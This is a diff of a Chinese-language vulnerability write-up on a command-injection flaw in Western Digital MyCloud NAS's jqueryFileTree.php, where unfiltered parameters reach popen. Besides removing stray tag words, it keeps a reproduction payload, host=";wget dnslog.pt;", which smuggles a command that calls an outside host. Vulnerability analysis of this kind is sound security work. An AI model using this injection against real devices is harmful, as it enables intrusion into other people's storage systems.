@@ -22,14 +22,6 @@ Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集�
 
 # 漏洞分析
 
-深入探索
-
-计算机驱动器和存储设备
-
-编程
-
-代理
-
 直接看 `jqueryFileTree.php` 其业务实现逻辑如下
 
 ```
@@ -71,14 +63,6 @@ error_reporting(0);
        $handle = popen($cmd, 'r');
 ```
 
-深入探索
-
-数据管理
-
-软件
-
-计算机安全
-
 多个参数如`host`、`pwd`、`user`、`dir`、`lang`均未过滤或校验，被直接使用`sprintf`格式化拼接后使用`popen`进行[执行命令](https://mrxn.net/tag/rce)，造成[命令注入漏洞](https://mrxn.net/tag/rce)。
 
 # 漏洞复现
@@ -95,4 +79,4 @@ host=";wget dnslog.pt;"
 
 在DNSLOG平台成功收到DNS和HTTP请求
 
-云存储
+数据备份与恢复
